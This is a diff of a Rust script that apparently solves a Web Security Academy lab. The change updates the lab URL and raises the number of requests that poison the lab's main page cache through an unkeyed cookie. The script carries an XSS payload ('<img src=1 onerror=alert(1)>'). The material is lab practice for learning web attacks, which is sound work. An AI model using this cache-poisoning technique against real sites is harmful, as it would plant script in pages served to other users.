@@ -19,15 +19,15 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a4400f304c3270181dd0c4700ba0012.web-security-academy.net";
+const LAB_URL: &str = "https://0a140047036b2d5f8250c4ee00ce00a8.web-security-academy.net";
 
 fn main() {
     let payload = r###" "}</script><img src=1 onerror=alert(1)> "###;
 
-    // send multiple request to cache the request
-    // 5 is enough
-    for i in 1..=5 {
-        print!("\r❯❯ Poisoning the main page with an unkeyed cookie ({i}/5).. ");
+    // 5 times is enough for caching
+    // 30 times to reach the max-age and start caching again (just to make sure that the request is cached to mark the lab as solved)
+    for i in 1..=30 {
+        print!("\r❯❯ Poisoning the main page with an unkeyed cookie ({i}/30).. ");
         flush_terminal();
 
         poison_main_page(payload);
